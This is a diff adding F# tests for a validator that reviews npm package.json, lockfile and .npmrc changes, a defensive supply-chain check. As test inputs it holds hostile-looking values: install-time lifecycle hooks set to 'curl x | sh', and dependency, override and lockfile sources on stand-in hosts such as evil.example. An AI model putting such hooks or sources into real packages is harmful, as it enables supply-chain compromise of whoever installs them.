@@ -194,6 +194,34 @@ let tests: (string * (unit -> unit)) list =
           let mutRed = match RedEvidence.CreateAgainstMutant([ outcome "a" 0 ], 1) with Ok r -> r | Error e -> failwith e
           check (Result.isOk (VerifiedEvidence.Create(1, [ outcome "a" 0 ], mutRed, [ outcome "a" 0 ]))) "stash all green is fine"
           check (Result.isError (VerifiedEvidence.Create(1, [ outcome "a" 0 ], red, [ outcome "a" 0 ]))) "still an error for ordinary red"
+      "npm: a registry dependency range is fine, a git, url, file or alias spec is not", fun () ->
+          let pkg deps = $"""{{ "name": "app", "dependencies": {{ {deps} }} }}"""
+          check (Result.isOk (PackageJsonChange.review "web/package.json" None (Some(pkg "\"react\": \"^18.2.0\", \"lodash\": \"latest\", \"x\": \">=1 <2\"")))) "ranges"
+          for spec in [ "git+https://evil/x.git"; "github:evil/x"; "file:../x"; "link:../x"; "https://evil/x.tgz"; "npm:other@1"; "http://x/y.tgz" ] do
+              check (Result.isError (PackageJsonChange.review "package.json" None (Some(pkg $"\"x\": \"{spec}\"")))) spec
+      "npm: lifecycle scripts that run at install time cannot be added or changed, ordinary scripts can", fun () ->
+          let pkg scripts = $"""{{ "scripts": {{ {scripts} }} }}"""
+          check (Result.isOk (PackageJsonChange.review "package.json" None (Some(pkg "\"test\": \"vitest\", \"build\": \"tsc\"")))) "test, build"
+          for hook in [ "preinstall"; "install"; "postinstall"; "prepare"; "prepublish" ] do
+              check (Result.isError (PackageJsonChange.review "package.json" None (Some(pkg $"\"{hook}\": \"curl x | sh\"")))) hook
+          let before = pkg "\"postinstall\": \"node patch.js\""
+          check (Result.isOk (PackageJsonChange.review "package.json" (Some before) (Some before))) "what the repo already had is trusted"
+      "npm: bundled dependencies and non-JSON are refused", fun () ->
+          check (Result.isError (PackageJsonChange.review "package.json" None (Some """{ "bundleDependencies": ["x"] }"""))) "bundled"
+          check (Result.isError (PackageJsonChange.review "package.json" None (Some "{ not json"))) "not json"
+      "npm: overrides are judged like dependencies", fun () ->
+          check (Result.isError (PackageJsonChange.review "package.json" None (Some """{ "overrides": { "x": { "y": "github:evil/y" } } }"""))) "nested override"
+          check (Result.isOk (PackageJsonChange.review "package.json" None (Some """{ "overrides": { "x": "1.2.3" } }"""))) "pinned"
+      "npm: lockfile resolved URLs must be on the pinned registry; .npmrc cannot change", fun () ->
+          let lock url = $"""{{ "lockfileVersion": 3, "packages": {{ "": {{ "name": "app" }}, "node_modules/x": {{ "version": "1.0.0", "resolved": "{url}" }} }} }}"""
+          check (Result.isOk (PackageJsonChange.review "package-lock.json" None (Some(lock "https://registry.npmjs.org/x/-/x-1.0.0.tgz")))) "registry"
+          check (Result.isError (PackageJsonChange.review "package-lock.json" None (Some(lock "https://evil.example/x-1.0.0.tgz")))) "elsewhere"
+          let old = lock "https://evil.example/x-1.0.0.tgz"
+          check (Result.isOk (PackageJsonChange.review "package-lock.json" (Some old) (Some old))) "already there"
+          check (Result.isError (PackageJsonChange.review ".npmrc" None (Some "registry=https://evil/"))) "npmrc"
+      "npm: which repo files are npm restore inputs", fun () ->
+          check (PackageJsonChange.affects "web/package.json" && PackageJsonChange.affects "package-lock.json" && PackageJsonChange.affects ".npmrc") "inputs"
+          check (not (PackageJsonChange.affects "src/Rater.cs")) "not an input"
       "state: turn budget", fun () ->
           let turn = [ TurnStarted Small; TurnEnded ]
           let s = TaskState.replay limits (List.concat [ turn; turn; turn; [ TurnStarted Small ] ])
